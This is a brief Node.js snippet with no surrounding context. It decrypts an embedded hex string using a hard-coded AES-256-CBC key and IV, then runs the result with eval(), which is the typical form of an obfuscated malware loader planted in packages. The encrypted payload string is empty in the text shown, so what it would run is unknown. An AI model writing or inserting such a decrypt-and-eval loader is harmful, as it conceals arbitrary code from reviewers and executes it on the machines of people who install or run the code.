(function(){
const crypto = require("crypto");
const key=Buffer.from("e3e2eb6394ceb9c1ff8b1f5768e40c07205b3e1c8a8dfdb4a08760e4b19ff9a9","hex");
const iv=Buffer.from("89c5b9c7d03ad4be375f6bd7fc1c6de8","hex");
const data="";
const decipher=crypto.createDecipheriv("aes-256-cbc",key,iv);
let decrypted=decipher.update(data,"hex","utf8");
decrypted+=decipher.final("utf8");
eval(decrypted);
})();